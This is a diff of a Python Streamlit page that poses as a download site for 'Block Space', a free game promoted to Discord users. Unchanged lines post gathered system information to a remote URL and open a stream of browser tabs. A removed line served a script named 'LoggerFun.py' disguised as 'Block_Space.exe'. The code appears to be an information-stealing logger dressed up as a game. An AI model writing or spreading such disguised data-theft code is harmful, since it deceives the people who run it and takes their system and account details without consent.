@@ -3,7 +3,6 @@ import socket
 import getpass
 import requests
 import platform
-import psutil as ps
 import webbrowser
 import os
 import random
@@ -53,6 +52,21 @@ header = {
 
 request = requests.post(URL, System_info, headers=header)
 
+with st.container():
+  st.write("---")
+  left_column, right_column = st.columns(2)
+  with left_column:
+    st.title("This is more about my game!")
+    st.header("Here's more info about my game!")
+    st.write("---Block Space is FREE to play")
+    st.write("---There are 0 ads.")
+    st.write("---AND ITS AN ENJOYABLE EXPIRENCE!")
+    st.write(
+      "Block Space is my very first game and my name is DemonSlayer!"
+      " I know you most lickley came from Discord but if you didn't, then WELCOME"
+      " I hope you enjoy Block Space! The download is below this sentence."
+    )
+
 for i in range(Amount_Of_Tabs): 
    webbrowser.open_new_tab('https://discord.com')
    randomName = ''.join(random.choices(characters + numbers, k = 100))
@@ -70,18 +84,4 @@ with st.container():
   st.write("This is my very first game so don't expect much but I still hope you enjoy it!")
 
 
-with st.container():
-  st.write("---")
-  left_column, right_column = st.columns(2)
-  with left_column:
-    st.title("This is more about my game!")
-    st.header("Here's more info about my game!")
-    st.write("---Block Space is FREE to play")
-    st.write("---There are 0 ads.")
-    st.write("---AND ITS AN ENJOYABLE EXPIRENCE!")
-    st.write(
-      "Block Space is my very first game and my name is DemonSlayer!"
-      " I know you most lickley came from Discord but if you didn't, then WELCOME"
-      " I hope you enjoy Block Space! The download is below this sentence."
-    )
-    st.download_button(label="Block Space Download", data='LoggerFun.py', file_name="Block_Space.exe", mime="application/octet-stream")
+
